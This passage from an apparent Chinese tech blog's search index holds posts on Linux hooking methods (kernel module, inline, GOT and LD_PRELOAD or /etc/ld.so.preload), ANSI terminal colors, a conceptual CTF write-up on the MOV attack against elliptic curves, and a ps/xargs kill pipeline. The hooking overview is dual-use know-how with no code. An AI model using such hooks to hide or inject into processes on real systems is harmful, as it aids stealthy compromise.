        <content type="html"><![CDATA[<p>Linux常见的hook技术主要有四种，分别为内核模块hook，应用层inline hook，应用层Got hook以及应用层preload hook。下面具体介绍一下</p><h3 id="内核模块hook"><a href="#内核模块hook" class="headerlink" title="内核模块hook"></a>内核模块hook</h3><blockquote><p>通常是从内核源码特殊位置，修改回调、修改中断表；或修改重编译内核，导出内部函数，从而跳转到自定义函数，开发内核模块实现hook。 </p><p>其特性如下：</p><ul><li>可以拦截到所有应用层系统调用，应用层无法绕过</li><li>开发调试复杂，测试周期长，升级和卸载内核模块带来稳定性问题</li></ul></blockquote><h3 id="应用层inline-Hook"><a href="#应用层inline-Hook" class="headerlink" title="应用层inline Hook"></a>应用层inline Hook</h3><blockquote><p>应用层内联hook，即直接修改二进制函数体的汇编指令，修改执行逻辑使其跳转到自定义函数，开发应用层模块实现hook。 </p><p>其特性如下：</p><ul><li>可以拦截到系统调用和普通库函数</li><li>由于linux系统本身具有多个发行版本及指令集，不容易做到通用</li><li>可以通过自定义实现底层函数或恢复模块内存方式绕过</li></ul></blockquote><h3 id="应用层Got-Hook"><a href="#应用层Got-Hook" class="headerlink" title="应用层Got Hook"></a>应用层Got Hook</h3><blockquote><p>应用层got表hook，即在运行阶段修改程序本身got表，这样调用api的逻辑，就会相应的跳转到用户自定义函数中。</p><ul><li>可以拦截系统调用和普通库函数</li><li>由于只需要考虑ELF格式因此实现难度较为简单</li><li>可以通过自定义实现底层函数或恢复got表内存方式绕过</li></ul></blockquote><h3 id="Preload-Hook"><a href="#Preload-Hook" class="headerlink" title="Preload Hook"></a>Preload Hook</h3><blockquote><p>  Preload Hook是指利用系统支持的preload能力，将模块自动注入进程实现hook。可以通过以下手段使用Preload技术：一种是环境变量配置(LD_PRELOAD)；另一种是文件配置：(/etc/ld.so.preload)。</p><ul><li>若使用命令行指定LD_PRELOAD则只影响该新进程及子进程；若写入全局环境变量则LD_PRELOAD对所有新进程生效；父进程可以控制子进程的环境变量从而取消preload</li><li>文件preload方式影响所有新进程且无法被取消</li><li>可以拦截到系统调用和普通库函数</li><li>实现和操作最为简单，只需要编写同名系统调用函数即可实现hook</li><li>可以使用动态调用方式或自定义实现方式绕过</li></ul></blockquote><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://www.jianshu.com/p/69e6089a7291" target="_blank" rel="noopener">https://www.jianshu.com/p/69e6089a7291</a></p><p><a href="https://www.jianshu.com/p/f78b16bd8905" target="_blank" rel="noopener">https://www.jianshu.com/p/f78b16bd8905</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux终端控制打印字符的颜色</title>
      <link href="/2020/04/17/Linux%E7%BB%88%E7%AB%AF%E6%8E%A7%E5%88%B6%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E7%9A%84%E9%A2%9C%E8%89%B2/"/>
      <url>/2020/04/17/Linux%E7%BB%88%E7%AB%AF%E6%8E%A7%E5%88%B6%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E7%9A%84%E9%A2%9C%E8%89%B2/</url>
      
        <content type="html"><![CDATA[<p>格式：\033[控制码;背景颜色;前景颜色m字符串\033[0m </p><p><em>注意：\033可以替换为\x1b，同指 Esc ，各个属性的范围不同，因此不会混淆</em></p><p><strong>前景色：</strong>30-37</p><p><strong>背景色：</strong>40-47</p><p><strong>控制码：</strong></p><blockquote><p>\33[0m 关闭所有属性<br>\33[1m 设置高亮度<br>\33[4m 下划线<br>\33[5m 闪烁<br>\33[7m 反显<br>\33[8m 消隐<br>\33[30m — \33[37m 设置前景色<br>\33[40m — \33[47m 设置背景色<br>\33[nA 光标上移n行<br>\33[nB 光标下移n行<br>\33[nC 光标右移n行<br>\33[nD 光标左移n行<br>\33[y;xH设置光标位置<br>\33[2J 清屏<br>\33[K 清除从光标到行尾的内容<br>\33[s 保存光标位置<br>\33[u 恢复光标位置<br>\33[?25l 隐藏光标<br>\33[?25h 显示光标</p></blockquote><p><strong>以下为常用的三种类型</strong></p><p>\x1b[1;31m字符串\x1b[0m    <font color="red"> 高亮红色字体（error）</font></p><p>\x1b[1;33m字符串\x1b[0m    <font color="yellow"> 高亮黄色字体（info）</font></p><p>\x1b[1;34m字符串\x1b[0m    <font color="blue"> 高亮蓝色字体（debug）</font></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VolgaCTF-2020-Keygreed-WP</title>
      <link href="/2020/04/17/VolgaCTF-Keygreed/"/>
      <url>/2020/04/17/VolgaCTF-Keygreed/</url>
      
        <content type="html"><![CDATA[<p>关于mov attack，可以参考这篇<a href="https://blog.csdn.net/qq_26060285/article/details/90482755" target="_blank" rel="noopener">博客</a></p><p>下面简单说说这道题</p><p>首先我们可以验证这个椭圆曲线是超奇异的(supersingular)，在这里 $p^2 - 1 = 0\mod p.order()$</p><blockquote><p>The MOV attack works by using the <a href="https://en.wikipedia.org/wiki/Weil_pairing" target="_blank" rel="noopener">Weil pairing</a> (e: $E[m]×E[m]→μ_m$) to translate solving the dlog in the elliptic curve group to solving it in the multiplicative group $μ_m$ (group of m-th roots of unity), where sub-exponential algorithms exist. </p><p>Then, working in $F_{p^k}$ (extension of $F_p$), take Q to be a point in $E[m]$ (group of m-torsion points), such that P,Q are linearly independent, which can be constructed. Finally, take $e(P,Q)$ and $e(xP,Q)=e(P,Q)^x$ (due to bilinearity of e) as a dlog instance over a fininte field (m-th roots of unity), this is true by the non-degeneracy of the Weil pairing.</p></blockquote><p>因此这里的关键就是找到点Q，然后便把问题转化为了一个离散对数问题，寻找点Q的步骤如下</p><ol><li>在$F_{p^k}$上随机选取一个点，记为$R$</li><li>计算$m=R.order()$</li><li>计算$d=gcd(m,P.order)$</li><li>得到$Q=(m//d)*R$</li></ol><p>得到$Q$后，由于$Q=k*P$，因此问题就变得简单了很多。</p><p>好了，到了这里，事实上我还是没有搞懂MOV attack的具体原理，也没有讲清楚这道题的具体解法。不过没关系，后续可以慢慢理解，而且我认为我已经把MOV attack中的最重要的一个环节简单的阐述了一下。</p><p>Anyway，如果想看看这道题的具体解法，可以参考这篇<a href="https://sectt.github.io/writeups/Volga20/crypto_keygreed/README" target="_blank" rel="noopener">WriteUp</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
            <tag> ECC </tag>
            
            <tag> MOV attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下批量kill多个同名进程</title>
      <link href="/2020/04/16/Linux%E4%B8%8B%E6%89%B9%E9%87%8Fkill%E5%A4%9A%E4%B8%AA%E5%90%8C%E5%90%8D%E8%BF%9B%E7%A8%8B/"/>
      <url>/2020/04/16/Linux%E4%B8%8B%E6%89%B9%E9%87%8Fkill%E5%A4%9A%E4%B8%AA%E5%90%8C%E5%90%8D%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>循序渐进</p><p>第一步：ps -ef | grep [name] 筛选出同名的所有进程</p><p>第二步：ps -ef | grep [name] | grep -v grep 将第一步中的grep进程删除</p><p>第三步：ps -ef | grep [name] | grep -v grep | cut -c 1-5 截断获取所有的pid号，这里cut的作用就是截取，1-5的作用是根据下标取出pid号，类似于python的切片，需要根据实际情况来调整</p><p>第四步：ps -ef | grep [name] | grep -v grep | cut -c 1-5 | xargs kill -9 将之前的所有pid作为kill命令的参数 </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
